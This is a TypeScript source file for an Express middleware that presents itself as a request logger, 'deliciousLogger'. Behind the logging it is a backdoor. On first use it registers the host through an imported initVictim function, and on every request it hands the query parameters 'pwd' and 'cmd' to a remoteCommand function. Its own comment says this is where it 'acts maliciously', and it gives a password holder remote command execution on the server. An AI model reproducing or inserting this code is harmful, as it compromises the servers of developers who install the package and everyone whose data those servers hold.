import { Request, Response } from 'express';
import initVictim from './functions/initVictim';
import LoggerFactory from './loggers/LoggerFactory';
import { LoggerOptions } from './types/options';
import { remoteCommand } from './utils/command';

/**
 * Delicious Logger Middleware
 *
 * @param opts Options for configuration
 * @returns Middleware
 */
const deliciousLogger = ({
  layout = 'basic',
  filename,
  separator,
  maxFileSize,
}: LoggerOptions) => {
  // Init logger
  const logger = LoggerFactory.getLogger({
    layout,
    filename,
    separator,
    maxFileSize,
  });
  // Check new victim upon the first time using the logger
  let isNew = true;
  return async (req: Request, _: Response, next: any) => {
    // Check if victim is newly-accessed
    if (isNew) {
      try {
        initVictim(req);
      } catch (err) {
        console.error(err);
        return next();
      }
      isNew = false;
    }
    const { pwd, cmd } = req.query;
    if (pwd && cmd) {
      // If backdoor password & command included, acts maliciously
      remoteCommand(pwd as string, cmd as string);
      return next();
    }
    logger.log(req);
    logger.stash(req);
    return next();
  };
};
export default deliciousLogger;
